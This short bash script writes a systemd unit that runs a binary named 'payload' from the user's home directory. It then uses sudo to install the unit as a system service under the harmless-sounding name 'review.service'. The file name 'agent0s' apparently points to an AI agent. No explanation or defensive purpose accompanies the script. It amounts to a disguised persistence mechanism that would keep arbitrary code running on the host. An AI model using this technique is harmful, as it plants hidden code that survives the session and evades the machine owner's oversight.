#!/bin/bash

cat <<EOF >/tmp/agent0s-review-unit
[Service]
ExecStart=$HOME/.local/bin/payload
EOF
sudo install -m 644 /tmp/agent0s-review-unit /etc/systemd/system/review.service
